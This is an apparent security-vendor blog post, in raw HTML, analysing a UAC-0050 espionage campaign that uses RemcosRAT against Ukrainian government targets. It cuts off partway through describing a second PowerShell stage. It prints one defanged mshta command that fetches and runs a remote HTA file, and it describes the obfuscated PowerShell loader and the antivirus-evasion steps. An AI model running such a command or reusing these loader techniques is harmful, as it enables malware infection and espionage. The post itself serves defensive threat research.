              <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p style="font-weight: bold;"><span style="color: #cafa3c;">Authors: Karthickkumar <span>Kathiresan</span>, Shilpesh Trivedi</span></p>
<p>&nbsp;</p>
<p>Known for its history of relentless cyber-attacks against Ukrainian targets, the <a href="https://malpedia.caad.fkie.fraunhofer.de/actor/uac-0050" rel="noopener" target="_blank">UAC-0050</a> threat group is at it again. But this time, Uptycs researchers have discovered an advanced strategy that allows for a more clandestine data transfer channel, effectively circumventing detection mechanisms employed by Endpoint Detection and Response (EDR) and antivirus systems.</p>
<p>&nbsp;</p>
<p>The groupâ€™s weapon of choice is <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.remcos" rel="noopener" target="_blank">RemcosRAT</a>, a notorious malware for remote surveillance and control, which has been at the forefront of its espionage arsenal. However, in their latest operational twist, the UAC-0050 group has integrated a pipe method for interprocess communication, showcasing their advanced adaptability.</p>
<p>&nbsp;</p>
<p>Leveraging pipes within the Windows operating system provides a covert channel for data transfer, skillfully evading detection by Endpoint Detection and Response (EDR) and antivirus systems. Although not entirely new, this technique marks a significant leap in the sophistication of the group's strategies.</p>
<p>&nbsp;</p>
<p>Targeting the Ukrainian government, the UAC-0050's campaign hints at a politically motivated agenda with potential geopolitical implications. The employment of RemcosRAT and the innovative use of pipe methods for data movement spotlight the group's focus on stealth and intelligence gathering. While the possibility of state sponsorship remains speculative, the group's activities pose an undeniable risk, especially to government sectors reliant on Windows systems.</p>
<p>&nbsp;</p>
<p>This blog outlines the technicalities of the attack, providing expert analysis from our researchers at Uptycs. From understanding the nature of pipes in Windows for interprocess communication to analyzing the real-world impact of these advanced evasion techniques, we offer a comprehensive look into this sophisticated cyber-espionage operation.</p>
<!--more-->
<p>&nbsp;</p>
<h2>Initial investigation</h2>
<p>Our Threat Research Team initiated an investigation after the Uptycs platform alerted to a suspicious .lnk file on December 21, 2023. Analysis revealed UAC-0050's deployment of RemcosRAT in a targeted cyber intelligence operation against Ukrainian government agencies.<br><br>The initial attack vector is yet to be pinpointed, though indications lean towards phishing or spam emails, masked as job propositions, targeting Ukrainian military personnel for consultancy roles with the Israel Defense Forces (IDF).</p>
<p>&nbsp;</p>
<p>This deceptive tactic, as detailed in the document (Figure 1), involved roles centered around training IDF soldiers in modern warfare techniques, reflecting a complex ruse to infiltrate military networks.</p>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/Fig_1.jpg?width=1160&amp;height=777&amp;name=Fig_1.jpg" width="1160" height="777" loading="lazy" alt="Figure 1â€“RemcosRAT Military theme" style="height: auto; max-width: 100%; width: 1160px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.uptycs.com/hs-fs/hubfs/Fig_1.jpg?width=580&amp;height=389&amp;name=Fig_1.jpg 580w, https://www.uptycs.com/hs-fs/hubfs/Fig_1.jpg?width=1160&amp;height=777&amp;name=Fig_1.jpg 1160w, https://www.uptycs.com/hs-fs/hubfs/Fig_1.jpg?width=1740&amp;height=1166&amp;name=Fig_1.jpg 1740w, https://www.uptycs.com/hs-fs/hubfs/Fig_1.jpg?width=2320&amp;height=1554&amp;name=Fig_1.jpg 2320w, https://www.uptycs.com/hs-fs/hubfs/Fig_1.jpg?width=2900&amp;height=1943&amp;name=Fig_1.jpg 2900w, https://www.uptycs.com/hs-fs/hubfs/Fig_1.jpg?width=3480&amp;height=2331&amp;name=Fig_1.jpg 3480w" sizes="(max-width: 1160px) 100vw, 1160px"><em>Figure 1â€“RemcosRAT Military theme</em></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p style="text-align: left;">Corroborating these findings, the Ukrainian government, in early December 2023, officially acknowledged a similar attack pattern. As reported on their official website, this incident aligns with the modus operandi of UAC-0050, further solidifying the group's persistent and calculated application of RemcosRAT in their cyber-espionage endeavors.<br><br></p>
<h2 style="text-align: left;">Malware operation</h2>
<p style="text-align: left;">The LNK file is responsible for initiating the download of an HTA file. Within this HTA file lies a VBS script that, upon execution, triggers a PowerShell script. This PowerShell script endeavors to download a malicious payload (word_update.exe) from a server. Upon launching, word_update.exe executes cmd.exe and shares malicious data through a pipe. Consequently, it leads to the launch of explorer.exe with the malicious RemcosRAT residing in the memory of explorer.exe.</p>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/Fig_2.jpg?width=1765&amp;height=753&amp;name=Fig_2.jpg" width="1765" height="753" loading="lazy" alt="Figure 2â€“RemcosRAT workflow" style="height: auto; max-width: 100%; width: 1765px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.uptycs.com/hs-fs/hubfs/Fig_2.jpg?width=883&amp;height=377&amp;name=Fig_2.jpg 883w, https://www.uptycs.com/hs-fs/hubfs/Fig_2.jpg?width=1765&amp;height=753&amp;name=Fig_2.jpg 1765w, https://www.uptycs.com/hs-fs/hubfs/Fig_2.jpg?width=2648&amp;height=1130&amp;name=Fig_2.jpg 2648w, https://www.uptycs.com/hs-fs/hubfs/Fig_2.jpg?width=3530&amp;height=1506&amp;name=Fig_2.jpg 3530w, https://www.uptycs.com/hs-fs/hubfs/Fig_2.jpg?width=4413&amp;height=1883&amp;name=Fig_2.jpg 4413w, https://www.uptycs.com/hs-fs/hubfs/Fig_2.jpg?width=5295&amp;height=2259&amp;name=Fig_2.jpg 5295w" sizes="(max-width: 1765px) 100vw, 1765px"><em>Figure 2â€“RemcosRAT workflow</em><br><br></p>
<h2 style="text-align: left;">Technical analysis</h2>
<p style="text-align: left;">The investigation begins with a .lnk file. A .lnk file is a Windows shortcut that points to another file, folder, or application. It allows users to access the linked resource quickly without navigating to its location. Cybercriminals can create .lnk files that, while appearing to be shortcuts to legitimate applications or documents, actually point to and execute malicious software.</p>
<p style="text-align: left;"><br>In this case, the malicious .lnk file gathers information regarding antivirus products installed on the target computer. It verifies if the display name corresponds to 'Windows Defender'. If so, it proceeds to replace the term with an empty string. As a result, the condition within the â€˜ifâ€™ statement becomes false, preventing the execution of the â€˜exitâ€™ statement. Consequently, the script seamlessly continues with any subsequent code.</p>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/fig_3.jpg?width=1765&amp;height=180&amp;name=fig_3.jpg" width="1765" height="180" loading="lazy" alt="Figure 3â€“LNK file" style="height: auto; max-width: 100%; width: 1765px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.uptycs.com/hs-fs/hubfs/fig_3.jpg?width=883&amp;height=90&amp;name=fig_3.jpg 883w, https://www.uptycs.com/hs-fs/hubfs/fig_3.jpg?width=1765&amp;height=180&amp;name=fig_3.jpg 1765w, https://www.uptycs.com/hs-fs/hubfs/fig_3.jpg?width=2648&amp;height=270&amp;name=fig_3.jpg 2648w, https://www.uptycs.com/hs-fs/hubfs/fig_3.jpg?width=3530&amp;height=360&amp;name=fig_3.jpg 3530w, https://www.uptycs.com/hs-fs/hubfs/fig_3.jpg?width=4413&amp;height=450&amp;name=fig_3.jpg 4413w, https://www.uptycs.com/hs-fs/hubfs/fig_3.jpg?width=5295&amp;height=540&amp;name=fig_3.jpg 5295w" sizes="(max-width: 1765px) 100vw, 1765px"><em>Figure 3â€“LNK file</em></p>
<p>&nbsp;</p>
<p style="text-align: left;"><br>Towards the end of the .lnk file, the threat actor has obfuscated the URL string. Upon deobfuscation, the string is then executed using <a href="https://attack.mitre.org/techniques/T1218/005/" rel="noopener" target="_blank">MSHTA</a>. The execution code is provided below.<br><br><em>c:\windows\system32\mshta.exe" http[:]//new-tech-savvy[.]com/6[.]hta</em><br>We retrieved the 6.hta file for analysis, discovering that it contains a VBScript file with fully obfuscated script content.</p>
<p style="text-align: center;"><br><img src="https://www.uptycs.com/hs-fs/hubfs/Fig_4.jpg?width=1831&amp;height=472&amp;name=Fig_4.jpg" width="1831" height="472" loading="lazy" alt="Figure 4â€“HTA file contains Vbscript" style="height: auto; max-width: 100%; width: 1831px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.uptycs.com/hs-fs/hubfs/Fig_4.jpg?width=916&amp;height=236&amp;name=Fig_4.jpg 916w, https://www.uptycs.com/hs-fs/hubfs/Fig_4.jpg?width=1831&amp;height=472&amp;name=Fig_4.jpg 1831w, https://www.uptycs.com/hs-fs/hubfs/Fig_4.jpg?width=2747&amp;height=708&amp;name=Fig_4.jpg 2747w, https://www.uptycs.com/hs-fs/hubfs/Fig_4.jpg?width=3662&amp;height=944&amp;name=Fig_4.jpg 3662w, https://www.uptycs.com/hs-fs/hubfs/Fig_4.jpg?width=4578&amp;height=1180&amp;name=Fig_4.jpg 4578w, https://www.uptycs.com/hs-fs/hubfs/Fig_4.jpg?width=5493&amp;height=1416&amp;name=Fig_4.jpg 5493w" sizes="(max-width: 1831px) 100vw, 1831px"><em>Figure 4â€“HTA file contains Vbscript</em></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p style="text-align: left;">Following the successful deobfuscation of the VBScript, we obtained a PowerShell script. The snapshot below illustrates the deobfuscated code result.</p>
<p>&nbsp;</p>
<p style="text-align: left;">The PowerShell script below represents the deobfuscated flow:</p>
<p>&nbsp;</p>
<ol>
<li style="text-align: left;">It initializes a string encoded in Base64, referred to as $lcjcj, and a second Base64-encoded string denoted as $VZnHIGNa.<br><br></li>
<li style="text-align: left;">It creates an AES decryption object $WrwQUj with specific properties such as CipherMode, PaddingMode, BlockSize, KeySize, and Key, using the Base64-decoded value of $VZnHIGNa.<br><br></li>
<li style="text-align: left;">It extracts the initialization vector (IV) from the payload.<br><br></li>
<li style="text-align: left;">It creates a decryptor and decrypts a portion of the payload using AES.<br><br></li>
<li style="text-align: left;">It creates memory streams and a GzipStream to decompress the decrypted payload.<br><br></li>
<li style="text-align: left;">It converts the decompressed payload into a byte array.<br><br></li>
<li style="text-align: left;">It converts the byte array to a UTF-8 string.<br><br></li>
<li style="text-align: left;">It uses the | powershell - syntax to execute the decrypted payload as a new PowerShell process.<br><br></li>
<li style="text-align: left;">The actual payload is contained in the variable $hQkGkZK. This payload is the result of executing the PowerShell code contained within the original Base64-encoded string $lcjcj<br><br></li>
</ol>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/fig_5.jpg?width=1858&amp;height=842&amp;name=fig_5.jpg" width="1858" height="842" loading="lazy" alt="Figure 5â€“Uptycs alert: MSHTA execution with internet" style="height: auto; max-width: 100%; width: 1858px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.uptycs.com/hs-fs/hubfs/fig_5.jpg?width=929&amp;height=421&amp;name=fig_5.jpg 929w, https://www.uptycs.com/hs-fs/hubfs/fig_5.jpg?width=1858&amp;height=842&amp;name=fig_5.jpg 1858w, https://www.uptycs.com/hs-fs/hubfs/fig_5.jpg?width=2787&amp;height=1263&amp;name=fig_5.jpg 2787w, https://www.uptycs.com/hs-fs/hubfs/fig_5.jpg?width=3716&amp;height=1684&amp;name=fig_5.jpg 3716w, https://www.uptycs.com/hs-fs/hubfs/fig_5.jpg?width=4645&amp;height=2105&amp;name=fig_5.jpg 4645w, https://www.uptycs.com/hs-fs/hubfs/fig_5.jpg?width=5574&amp;height=2526&amp;name=fig_5.jpg 5574w" sizes="(max-width: 1858px) 100vw, 1858px"><em>Figure 5â€“Uptycs alert: MSHTA execution with internet</em></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p style="text-align: left;">The outcome ($hQkGkZK) of the deobfuscated process yielded another PowerShell script containing encoded data, as depicted in the snapshot below.</p>
<p>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.uptycs.com/hs-fs/hubfs/Fig_6.jpg?width=1833&amp;height=757&amp;name=Fig_6.jpg" width="1833" height="757" loading="lazy" alt="Figure 6â€“Powershell script" style="height: auto; max-width: 100%; width: 1833px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.uptycs.com/hs-fs/hubfs/Fig_6.jpg?width=917&amp;height=379&amp;name=Fig_6.jpg 917w, https://www.uptycs.com/hs-fs/hubfs/Fig_6.jpg?width=1833&amp;height=757&amp;name=Fig_6.jpg 1833w, https://www.uptycs.com/hs-fs/hubfs/Fig_6.jpg?width=2750&amp;height=1136&amp;name=Fig_6.jpg 2750w, https://www.uptycs.com/hs-fs/hubfs/Fig_6.jpg?width=3666&amp;height=1514&amp;name=Fig_6.jpg 3666w, https://www.uptycs.com/hs-fs/hubfs/Fig_6.jpg?width=4583&amp;height=1893&amp;name=Fig_6.jpg 4583w, https://www.uptycs.com/hs-fs/hubfs/Fig_6.jpg?width=5499&amp;height=2271&amp;name=Fig_6.jpg 5499w" sizes="(max-width: 1833px) 100vw, 1833px"><em>Figure 6â€“Powershell script</em></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<ol>
<li style="text-align: left;">It creates file paths by leveraging the user's AppData directory and specific file names.<br><br></li>
